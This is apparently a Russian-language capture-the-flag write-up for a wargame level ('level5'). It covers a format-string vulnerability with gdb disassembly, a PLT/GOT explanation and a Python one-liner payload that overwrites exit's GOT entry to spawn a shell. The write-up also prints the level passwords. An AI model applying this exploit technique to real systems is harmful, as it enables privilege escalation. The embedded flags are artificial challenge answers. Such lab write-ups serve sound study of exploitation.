# su level5
# pass: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

====
Уязвимость: printf, (Format String Attack), plt, запись в GOT, подмена ссылки функции на необходимую
====

**Поведение: ждёт ввод, возвращает эту же строку. Переполнить не получилось.**

# ltrace ./level5 
   __libc_start_main(0x8048504, 1, 0xbffff804, 0x8048520, 0x8048590 <unfinished ...>
   fgets(12345
   "12345\n", 512, 0xb7fd1ac0)                                              = 0xbffff550
   printf("12345\n"12345
   )                                                              = 6
   exit(1 <unfinished ...>
   +++ exited (status 1) +++

Проверяем функции, переменные: 

# i func
<>
0x080484a4  o
0x080484c2  n
0x08048504  main
<>

# i var
<>
0x08049854  m

# x/a 0x08049854
0x8049854 <m>:  0x0

В мейне вызывается n

# disas main

Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave  
   0x08048510 <+12>:    ret    
End of assembler dump.

В n пользовательский ввод через fgets, а потом printf. 

# disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp                  536
   0x080484cb <+9>:     mov    0x8049848,%eax               stdin
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)             512
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax            -520
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax            512
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)                  1
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.

В функции o вызов system "/bin/sh"

# disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp                   24
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)            "/bin/sh"
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.

Вызова функции о нигде нет. Получается, нам через printf нужно записать адрес функции и вызвать его. 
При компиляции происходит динамическое подключение библиотеки. Отметка plt говорит о том, что используется таблица компоновки процедур. Тогда функция не вызывается напрямую, а вместо этого управление передается заглушке фунции, которая находится в таблице PLT (указано с помощью @PLT). Однако сама таблица PLT модифицироваться не должна, и ее можно поместить в сегмент, в котором разрешено только чтение. 
Для изменения используется Global Offset Table - глобальная таблица смещений. Модифицироваться может только таблица GOT, причем размер записи в ней равен 4 байта. (Как только динамический компоновщик определит адрес функции, он прежде, чем переходить к найденной функции, сохраняет результат в записи GOT, которая была использована в инструкции jmp в начале записи PLT. В результате во всех следующих обращениях к записи PLT переход к динамическому компоновщику происходить не будет, а вместо этого будет выполняться переход напрямую в функцию.)

Так как в функции написан exit, по завершению она будет выходить и не доходить до адреса возврата. Тогда можно попробовать перезаписать адрес exit из функции n на вызов o. 

# python -c 'print "AAAA" + " %p" * 6' > /tmp/l5

# cat /tmp/l5 | ./level5 
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025

exit на 4 позиции. адрес о = 0x080484a4

# disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.

Указатель на адрес exit = *0x8049838
x/a 0x8049838

C помощью %d обозначим число адрес 0x080484a4 в десятичной системе - записываем по этой позиции через %n 134513824 + 4 байта для адреса.

# python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/l5 

# cat /tmp/l5 - | ./level5

# cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
